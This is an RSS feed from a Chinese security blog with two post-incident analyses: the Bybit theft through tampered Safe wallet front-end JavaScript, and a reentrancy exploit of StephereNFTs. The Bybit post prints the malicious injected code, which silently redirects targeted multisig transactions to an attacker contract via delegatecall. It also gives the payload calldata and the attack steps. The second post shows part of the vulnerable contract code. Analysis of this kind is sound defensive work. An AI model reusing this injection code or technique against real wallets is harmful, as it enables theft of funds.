<?xml-stylesheet href="/rss.xsl" type="text/xsl"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Passi0n1's Blog</title><link>https://passi0n1.github.io/</link><description>Recent content on Passi0n1's Blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>Rise. 本站遵循 CC-BY-NC 4.0 协议</copyright><lastBuildDate>Tue, 08 Apr 2025 11:25:05 +0000</lastBuildDate><atom:link href="https://passi0n1.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>Bybit 被盗事件分析</title><link>https://passi0n1.github.io/posts/vol.2-bybit%E8%A2%AB%E7%9B%97/</link><pubDate>Tue, 08 Apr 2025 11:25:05 +0000</pubDate><guid>https://passi0n1.github.io/posts/vol.2-bybit%E8%A2%AB%E7%9B%97/</guid><description>Passi0n1's Blog https://passi0n1.github.io/posts/vol.2-bybit%E8%A2%AB%E7%9B%97/ -&lt;h3 id="案件元数据">案件元数据&lt;/h3>
&lt;pre tabindex="0">&lt;code>被盗合约：0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4
初始黑客地址：0x47666fab8bd0ac7003bce3f5c3585383f09486e2
黑客部署的恶意合约1：0x96221423681a6d52e184d440a8efcebb105c7242
黑客部署的恶意合约2：0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516
修改逻辑合约交易：0x46deef0f52e3a983b67abf4714448a41dd7ffd6d32d32da69d62081c68ad7882
盗窃交易1：0x25800d105db4f21908d646a7a3db849343737c5fba0bc5701f782bf0e75217c9
盗窃交易2：0xb61413c495fdad6114a7aa863a00b2e3c28945979a10885b12b30316ea9f072c
盗窃交易3：0xbcf316f5835362b7f1586215173cc8b294f5499c60c029a3de6318bf25ca7b20
盗窃交易4：0xa284a1bc4c7e0379c924c73fcea1067068635507254b03ebbbd3f4e222c1fae0
盗窃交易5：0x847b8403e8a4816a4de1e63db321705cdb6f998fb01ab58f653b863fda988647
Safe 事后审计报告：https://archive.ph/OxemM
官方报告（已失效）：https://docsend.com/view/s/rmdi832mpt8u93s7
OneKey 评价：https://x.com/OneKeyCN/status/1894783804512051469
23pd 评价：https://x.com/im23pds/status/1894637152392434013
ScamSniffer 分析：https://x.com/realScamSniffer/status/1894910207052128263
黑客测试交易：https://etherscan.io/tx/0xbe42ca77d43686c822a198c3641f3dadd1edcb5fde22fbc1738b3298a9c25ddb
Verichains 报告：https://github.com/verichains/public-audit-reports/blob/main/Bybit%20Incident%20Investigation%20-%20Preliminary%20Report%20v1.0%20(for%20public%20release).pdf
Safe 官网存档：https://web.archive.org/web/20250000000000*/safe.global
ChromeCacheView 下载地址：https://www.nirsoft.net/utils/chrome_cache_view.html
&lt;/code>&lt;/pre>&lt;p>事件涉及一笔修改合约交易和五笔盗窃交易：&lt;/p>
&lt;center>&lt;figure>&lt;img src="https://passi0n1.github.io/images/cap20250408235125.png" width="100%">
&lt;/figure>
&lt;/center>
&lt;p>Safe 合约被篡改的 JS 恶意文件如下：&lt;/p>
&lt;pre tabindex="0">&lt;code>恶意存档：
https://web.archive.org/web/20250219172905/https://app.safe.global/_next/static/chunks/pages/_app-52c9031bfa03da47.js
https://web.archive.org/web/20250219172905/https://app.safe.global/_next/static/chunks/6514.b556851795a4cbaa.js
正常存档：
https://web.archive.org/web/20250219111919/https://app.safe.global/_next/static/chunks/pages/_app-52c9031bfa03da47.js
https://web.archive.org/web/20250219111919/https://app.safe.global/_next/static/chunks/6514.b556851795a4cbaa.js
注：6514.b556851795a4cbaa.js 文件暂未找到，暂跳过分析。
&lt;/code>&lt;/pre>&lt;hr>
&lt;h2 id="具体分析">具体分析&lt;/h2>
&lt;h3 id="js-代码分析">JS 代码分析&lt;/h3>
&lt;p>以下是被篡改的核心 JS 代码片段：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> sd = c; &lt;span style="color:#228b22">// Safe SDK 实例
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> se = e; &lt;span style="color:#228b22">// 交易对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> st = t; &lt;span style="color:#228b22">// 交易选项
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> wa = [&lt;span style="color:#cd5555">&amp;#34;0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4&amp;#34;&lt;/span>, &lt;span style="color:#cd5555">&amp;#34;0x19c6876e978d9f128147439ac4cd9ea2582cd141&amp;#34;&lt;/span>]; &lt;span style="color:#228b22">// 目标 Safe 地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> ba = [&lt;span style="color:#cd5555">&amp;#34;0x828424517f9f04015db02169f4026d57b2b07229&amp;#34;&lt;/span>, &lt;span style="color:#cd5555">&amp;#34;0x7c1091cf6f36b0140d5e2faf18c3be29fee42d97&amp;#34;&lt;/span>]; &lt;span style="color:#228b22">// 目标签名者地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> ta = &lt;span style="color:#cd5555">&amp;#34;0x96221423681a6d52e184d440a8efcebb105c7242&amp;#34;&lt;/span>; &lt;span style="color:#228b22">// 黑客恶意合约地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> da = &lt;span style="color:#cd5555">&amp;#34;0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000&amp;#34;&lt;/span>; &lt;span style="color:#228b22">// 恶意数据
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> op = &lt;span style="color:#b452cd">1&lt;/span>; &lt;span style="color:#228b22">// 操作类型（delegatecall）
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> vl = &lt;span style="color:#b452cd">0&lt;/span>; &lt;span style="color:#228b22">// 交易价值
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> sga = &lt;span style="color:#b452cd">45746&lt;/span>; &lt;span style="color:#228b22">// Safe 交易 gas 限制
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> sf = sd.getSafeProvider();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> sa = &lt;span style="color:#8b008b;font-weight:bold">await&lt;/span> sf.getSignerAddress();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sa = sa.toLowerCase();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> lu = &lt;span style="color:#8b008b;font-weight:bold">await&lt;/span> sd.getAddress();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>lu = lu.toLowerCase();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">const&lt;/span> cf = wa.some(k1 =&amp;gt; lu.includes(k1)); &lt;span style="color:#228b22">// 检查是否为目标 Safe 地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">const&lt;/span> cb = ba.some(k1 =&amp;gt; sa.includes(k1)); &lt;span style="color:#228b22">// 检查是否为目标签名者地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (cf == &lt;span style="color:#8b008b;font-weight:bold">true&lt;/span> &amp;amp;&amp;amp; se.data.operation == &lt;span style="color:#b452cd">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">const&lt;/span> td = structuredClone(se.data); &lt;span style="color:#228b22">// 保存原始交易数据副本
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> se.data.to = ta; &lt;span style="color:#228b22">// 修改目标地址为黑客合约
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> se.data.operation = op; &lt;span style="color:#228b22">// 修改为 delegatecall
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> se.data.data = da; &lt;span style="color:#228b22">// 设置恶意数据
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> se.data.value = vl;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> se.data.safeTxGas = sga;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> l = &lt;span style="color:#8b008b;font-weight:bold">await&lt;/span> sd.executeTransaction(se, st); &lt;span style="color:#228b22">// 执行篡改后的交易
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> se.data = td; &lt;span style="color:#228b22">// 恢复原始数据
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span> } &lt;span style="color:#8b008b;font-weight:bold">catch&lt;/span> (e) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> se.data = td;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">throw&lt;/span> e;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#8b008b;font-weight:bold">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> l = &lt;span style="color:#8b008b;font-weight:bold">await&lt;/span> sd.executeTransaction(se, st); &lt;span style="color:#228b22">// 执行原始交易
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Verichains 提供了更清晰的注释版代码，逻辑如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> targetSafeAddresses = [&lt;span style="color:#cd5555">&amp;#34;0x1db92e2eebc8e0c075a02bea49a2935bcd2dfcf4&amp;#34;&lt;/span>, &lt;span style="color:#cd5555">&amp;#34;0x19c6876e978d9f128147439ac4cd9ea2582cd141&amp;#34;&lt;/span>]; &lt;span style="color:#228b22">// 攻击目标 Safe 地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> targetSignerAddresses = [&lt;span style="color:#cd5555">&amp;#34;0x828424517f9f04015db02169f4026d57b2b07229&amp;#34;&lt;/span>, &lt;span style="color:#cd5555">&amp;#34;0x7c1091cf6f36b0140d5e2faf18c3be29fee42d97&amp;#34;&lt;/span>]; &lt;span style="color:#228b22">// 目标签名者地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> attackerAddress = &lt;span style="color:#cd5555">&amp;#34;0x96221423681a6d52e184d440a8efcebb105c7242&amp;#34;&lt;/span>; &lt;span style="color:#228b22">// 黑客接收地址
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> attackPayload = &lt;span style="color:#cd5555">&amp;#34;0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000&amp;#34;&lt;/span>; &lt;span style="color:#228b22">// 恶意数据
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> attackOperation = &lt;span style="color:#b452cd">1&lt;/span>; &lt;span style="color:#228b22">// delegatecall 操作
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> attackValue = &lt;span style="color:#b452cd">0&lt;/span>; &lt;span style="color:#228b22">// 无 Ether 转移
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> attackSafeTxGas = &lt;span style="color:#b452cd">45746&lt;/span>; &lt;span style="color:#228b22">// 交易 gas 限制
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#228b22">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> safeSDK = c;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> safeProvider = safeSDK.getSafeProvider();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> signerAddress = &lt;span style="color:#8b008b;font-weight:bold">await&lt;/span> safeProvider.getSignerAddress().then(addr =&amp;gt; addr.toLowerCase());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">let&lt;/span> safeAddress = &lt;span style="color:#8b008b;font-weight:bold">await&lt;/span> safeSDK.getAddress().then(addr =&amp;gt; addr.toLowerCase());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">const&lt;/span> isTargetedSafe = targetSafeAddresses.some(addr =&amp;gt; safeAddress.includes(addr));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">const&lt;/span> isTargetedSigner = targetSignerAddresses.some(addr =&amp;gt; signerAddress.includes(addr));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">if&lt;/span> (isTargetedSafe &amp;amp;&amp;amp; safeTransaction.data.operation === &lt;span style="color:#b452cd">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">const&lt;/span> originalTransactionData = structuredClone(safeTransaction.data);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> safeTransaction.data.to = attackerAddress;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> safeTransaction.data.operation = attackOperation;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> safeTransaction.data.data = attackPayload;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> safeTransaction.data.value = attackValue;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> safeTransaction.data.safeTxGas = attackSafeTxGas;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">try&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> l = &lt;span style="color:#8b008b;font-weight:bold">await&lt;/span> safeSDK.executeTransaction(safeTransaction, txOptions);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> safeTransaction.data = originalTransactionData;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#8b008b;font-weight:bold">catch&lt;/span> (error) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> safeTransaction.data = originalTransactionData;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8b008b;font-weight:bold">throw&lt;/span> error;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} &lt;span style="color:#8b008b;font-weight:bold">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> l = &lt;span style="color:#8b008b;font-weight:bold">await&lt;/span> safeSDK.executeTransaction(safeTransaction, txOptions);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这段代码的逻辑非常清晰：黑客通过篡改 Safe Web UI 的 JS，拦截特定 Safe 地址的交易（&lt;code>targetSafeAddresses&lt;/code>），将其替换为通过 &lt;code>DELEGATECALL&lt;/code> 调用恶意合约的操作。篡改后的交易在受害者合约环境中执行，核心是通过 &lt;code>delegatecall&lt;/code> 将控制权交给黑客部署的恶意合约。&lt;/p>
&lt;p>攻击流程示意图如下：&lt;/p>
&lt;center>&lt;figure>&lt;img src="https://passi0n1.github.io/images/cap20250408235220.png" width="100%">
&lt;/figure>
&lt;/center>
&lt;center>&lt;figure>&lt;img src="https://passi0n1.github.io/images/cap20250408235228.png" width="100%">
&lt;/figure>
&lt;/center>
&lt;p>（其实后续通过研究js发现，没有限制签名者地址，只是限制了受害合约地址）&lt;/p>
&lt;hr>
&lt;h3 id="攻击交易分析">攻击交易分析&lt;/h3>
&lt;p>核心交易：
&lt;a href="https://app.blocksec.com/explorer/tx/eth/0x46deef0f52e3a983b67abf4714448a41dd7ffd6d32d32da69d62081c68ad7882">https://app.blocksec.com/explorer/tx/eth/0x46deef0f52e3a983b67abf4714448a41dd7ffd6d32d32da69d62081c68ad7882&lt;/a>&lt;/p>
&lt;p>交易截图：&lt;/p>
&lt;center>&lt;figure>&lt;img src="https://passi0n1.github.io/images/cap20250408235139.png" width="100%">
&lt;/figure>
&lt;/center>
&lt;p>链下与链上攻击时序图（来源于 NCC Group 分析报告：&lt;a href="https://www.nccgroup.com/sg/research-blog/in-depth-technical-analysis-of-the-bybit-hack/">https://www.nccgroup.com/sg/research-blog/in-depth-technical-analysis-of-the-bybit-hack/&lt;/a>）：&lt;/p>
&lt;center>&lt;figure>&lt;img src="https://passi0n1.github.io/images/cap20250408235146.png" width="100%">
&lt;/figure>
&lt;/center>
&lt;center>&lt;figure>&lt;img src="https://passi0n1.github.io/images/cap20250408235154.png" width="100%">
&lt;/figure>
&lt;/center>
&lt;hr>
&lt;h2 id="攻击详细步骤">攻击详细步骤&lt;/h2>
&lt;ol>
&lt;li>&lt;strong>前期准备&lt;/strong>：黑客提前入侵 Safe 的 AWS 存储桶，并且获取了 Bybit 的例行转账模式和相关信息。&lt;/li>
&lt;li>&lt;strong>篡改前端&lt;/strong>：黑客修改了 Safe Web UI 的 JS 代码，通过逻辑拦截筛选特定交易，并将其替换为恶意内容。&lt;/li>
&lt;li>&lt;strong>伪装交易&lt;/strong>：为了避免 Bybit 员工察觉，黑客保存了原始交易数据的副本，在前端页面展示正常内容，诱导员工相信交易未被篡改。（显然，员工过于信任 Safe 的界面，未仔细核对钱包显示的实际内容。）&lt;/li>
&lt;li>&lt;strong>签名触发&lt;/strong>：一旦其他 Bybit 员工完成签名，篡改后的交易即被执行。&lt;/li>
&lt;li>&lt;strong>篡改细节&lt;/strong>：
&lt;ul>
&lt;li>操作类型（&lt;code>operation&lt;/code>）从 0 修改为 1（&lt;code>delegatecall&lt;/code>）。&lt;/li>
&lt;li>目标地址（&lt;code>to&lt;/code>）改为黑客恶意合约：&lt;code>0x96221423681a6d52e184d440a8efcebb105c7242&lt;/code>。&lt;/li>
&lt;li>数据（&lt;code>data&lt;/code>）设置为：&lt;code>0xa9059cbb000000000000000000000000bdd077f651ebe7f7b3ce16fe5f2b025be29695160000000000000000000000000000000000000000000000000000000000000000&lt;/code>，即调用 &lt;code>transfer&lt;/code> 函数，参数为地址 &lt;code>0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516&lt;/code> 和数量 0。&lt;/li>
&lt;li>&lt;strong>执行流程&lt;/strong>：
&lt;ul>
&lt;li>Bybit 员工通过 Safe Web UI 发起交易，调用 Safe 代理合约。&lt;/li>
&lt;li>代理合约通过 &lt;code>delegatecall&lt;/code> 调用 Safe 逻辑合约（&lt;code>masterCopy&lt;/code>）验证签名。&lt;/li>
&lt;li>签名验证通过后，逻辑合约根据 &lt;code>operation = 1&lt;/code> 再次通过 &lt;code>delegatecall&lt;/code> 调用恶意合约 &lt;code>0x96221423681a6d52e184d440a8efcebb105c7242&lt;/code>，传入篡改后的 &lt;code>data&lt;/code>。&lt;/li>
&lt;li>由于全程使用 &lt;code>delegatecall&lt;/code>，执行上下文始终是代理合约，最终 &lt;code>slot 0&lt;/code>（存储 &lt;code>masterCopy&lt;/code> 地址的槽）被修改为 &lt;code>0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516&lt;/code>。&lt;/li>
&lt;li>调用链等价于：&lt;code>Proxy -&amp;gt; delegatecall masterCopy -&amp;gt; delegatecall 0x96221423681a6d52e184d440a8efcebb105c7242&lt;/code>。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>后续提币&lt;/strong>：黑客通过直接调用 Safe 代理合约，触发恶意合约 &lt;code>0xbDd077f651EBe7f7b3cE16fe5F2b025BE2969516&lt;/code> 执行提币操作。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;hr>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>这次攻击暴露了多层安全漏洞，堪称“瑞士奶酪模型”的典型案例：&lt;/p>
&lt;ol>
&lt;li>&lt;strong>前端防护不足&lt;/strong>：若 JS 无法篡改前端显示内容，Bybit 员工不会被误导。&lt;/li>
&lt;li>&lt;strong>签名核查缺失&lt;/strong>：若三位员工仔细检查签名内容，可能拒绝签名。&lt;/li>
&lt;li>&lt;strong>合约设计缺陷&lt;/strong>：Safe 逻辑合约未限制 &lt;code>delegatecall&lt;/code> 的使用，导致 &lt;code>slot 0&lt;/code> 被恶意修改。若仅开放特定功能，可避免此类攻击。&lt;/li>
&lt;li>&lt;strong>交易校验缺失&lt;/strong>：若存在内部服务根据预定义策略检查交易，篡改行为可能被拦截。&lt;/li>
&lt;/ol>
&lt;center>&lt;figure>&lt;img src="https://passi0n1.github.io/images/cap20250408235444.png" width="100%">
&lt;/figure>
&lt;/center>
这些“奶酪洞”叠加，最终为黑客铺就了一条直捣黄龙的道路。Safe Web UI 的 JS 篡改只是切入点，而 Safe 逻辑合约对 `delegatecall` 的过度开放，以及缺乏交易语义校验（仅验证签名），才是灾难性后果的根源。
- https://passi0n1.github.io/posts/vol.2-bybit%E8%A2%AB%E7%9B%97/ - Rise. 本站遵循 CC-BY-NC 4.0 协议</description></item><item><title>StephereNFTs 遭遇重入攻击分析</title><link>https://passi0n1.github.io/posts/vol.1--step-hero%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/</link><pubDate>Fri, 21 Feb 2025 11:25:05 +0000</pubDate><guid>https://passi0n1.github.io/posts/vol.1--step-hero%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/</guid><description>Passi0n1's Blog https://passi0n1.github.io/posts/vol.1--step-hero%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/ -&lt;h2 id="攻击概述">攻击概述&lt;/h2>
&lt;p>2025 年 2 月 ，StephereNFTs 遭遇了一起严重的重入攻击，攻击者通过精心构造的恶意合约，利用智能合约逻辑漏洞，成功盗取了大量资金。&lt;/p>
&lt;h3 id="参考地址">参考地址：&lt;/h3>
&lt;p>&lt;a href="https://nickfranklin.site/2025/02/21/stepheronfts-attacked/">https://nickfranklin.site/2025/02/21/stepheronfts-attacked/&lt;/a>&lt;/p>
&lt;h2 id="相关地址">相关地址&lt;/h2>
&lt;ul>
&lt;li>&lt;strong>受害合约地址&lt;/strong>：&lt;code>0x9823e10a0bf6f64f59964be1a7f83090bf5728ab&lt;/code>&lt;/li>
&lt;li>&lt;strong>攻击者地址&lt;/strong>：&lt;code>0xFb1cc1548D039f14b02cfF9aE86757Edd2CDB8A5&lt;/code>&lt;/li>
&lt;li>&lt;strong>恶意合约1&lt;/strong>：&lt;code>0xd4c80700ca911d5d3026a595e12aa4174f4cacb3&lt;/code>&lt;/li>
&lt;li>&lt;strong>恶意合约2&lt;/strong>：&lt;code>0xb4c32404de3367ca94385ac5b952a7a84b5bdf76&lt;/code>&lt;/li>
&lt;li>&lt;strong>恶意合约3&lt;/strong>：&lt;code>0x8f327e60fb2a7928c879c135453bd2b4ed6b0fe9&lt;/code>&lt;/li>
&lt;li>&lt;strong>攻击交易 (tx)&lt;/strong>：https://bscscan.com/tx/0xef386a69ca6a147c374258a1bf40221b0b6bd9bc449a7016dbe5240644581877&lt;/li>
&lt;/ul>
&lt;h2 id="攻击步骤解析">攻击步骤解析&lt;/h2>
&lt;h3 id="1-部署恶意合约">1. 部署恶意合约&lt;/h3>
&lt;p>攻击者首先部署了多个恶意合约，以便后续进行重入攻击。&lt;/p>
&lt;center>&lt;figure>&lt;img src="https://passi0n1.github.io/images/424896141-692a2eae-d3d7-40bc-b16b-d86c061c5645.png" width="100%">&lt;figcaption>
&lt;h4>图1&lt;/h4>
&lt;/figcaption>
&lt;/figure>
&lt;/center>
&lt;h3 id="2-通过闪电贷获取初始资金">2. 通过闪电贷获取初始资金&lt;/h3>
&lt;p>攻击者利用闪电贷借入了一笔资金，用于后续触发合约的奖励机制。&lt;/p>
&lt;center>&lt;figure>&lt;img src="https://passi0n1.github.io/images/424903484-37fadaff-fa68-43cf-b0a7-c7d5f971b4c2.png" width="100%">&lt;figcaption>
&lt;h4>图2&lt;/h4>
&lt;/figcaption>
&lt;/figure>
&lt;/center>
&lt;center>&lt;figure>&lt;img src="https://passi0n1.github.io/images/424903603-00bd518d-2372-4e43-a7c6-f7b91f26245d.png" width="100%">&lt;figcaption>
&lt;h4>图3&lt;/h4>
&lt;/figcaption>
&lt;/figure>
&lt;/center>
通过购买资产获取奖励资格
&lt;h3 id="3-通过重入攻击不断获取受害合约资金">3. 通过重入攻击不断获取受害合约资金&lt;/h3>
&lt;p>攻击者发现受害合约的奖励机制存在漏洞：&lt;/p>
&lt;ul>
&lt;li>在领取奖励时，合约会检查推荐奖励的数量。&lt;/li>
&lt;li>但由于合约先发放奖励，再将奖励计数清零，导致可以在清零前重复调用领取奖励函数，实现重入攻击。&lt;/li>
&lt;/ul>
&lt;p>攻击者利用这一漏洞，不断调用恶意合约，通过递归方式重复领取奖励，最终盗取了大量资金。&lt;/p>
&lt;h2 id="关键漏洞分析">关键漏洞分析&lt;/h2>
&lt;p>该攻击的核心漏洞在于 &lt;strong>先发奖励后清零&lt;/strong> 的逻辑顺序问题，导致了经典的重入攻击 (Reentrancy Attack)。&lt;/p>
&lt;p>&lt;strong>漏洞代码示例&lt;/strong>：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-solidity" data-lang="solidity">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8b008b;font-weight:bold">function&lt;/span> &lt;span style="color:#008b45">claimReferral&lt;/span>(&lt;span style="color:#00688b;font-weight:bold">address&lt;/span> varg0) &lt;span style="color:#8b008b;font-weight:bold">public&lt;/span> nonPayable { find similar
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#658b00">require&lt;/span>(&lt;span style="color:#658b00">msg&lt;/span>.&lt;span style="color:#658b00">data&lt;/span>.length - &lt;span style="color:#b452cd">4&lt;/span> &amp;gt;= &lt;span style="color:#b452cd">32&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#658b00">require&lt;/span>(!_paused, Error(&lt;span style="color:#cd5555">&amp;#39;Pausable: paused&amp;#39;&lt;/span>));
